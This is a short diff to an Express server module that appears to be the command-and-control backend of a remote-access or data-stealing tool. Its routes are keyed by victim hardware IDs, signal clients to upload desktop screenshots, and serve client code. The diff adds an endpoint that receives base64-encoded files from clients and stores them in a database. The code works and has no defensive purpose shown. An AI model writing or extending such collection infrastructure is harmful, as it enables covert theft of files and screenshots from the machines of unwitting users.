@@ -52,6 +52,7 @@ module.exports = (app) => {
         res.status(200).send({});
     });
 
+    // should client upload screenshot of desktop
     app.get('/ss/:hwid', (req, res) => {
         const hwid = req.params.hwid;
 
@@ -61,6 +62,21 @@ module.exports = (app) => {
         }
 
         res.status(200).send('false');
+    });
+
+    app.post('/fu/:hwid', (req, res) => {
+        const hwid = req.params.hwid;
+        const contents = req.body.contents; // base64
+        const fileName = req.body.name;
+        const description = req.body.description || 'Not specified';
+
+        if (!contents || !fileName) return res.status(200).send({});
+
+        app.db
+            .prepare('INSERT INTO file_uploads (date, hwid, contents, name, description) VALUES (?, ?, ?, ?, ?)')
+            .run(Date.now(), hwid, contents, fileName, description);
+
+        res.status(200).send({});
     });
 
     // get client code
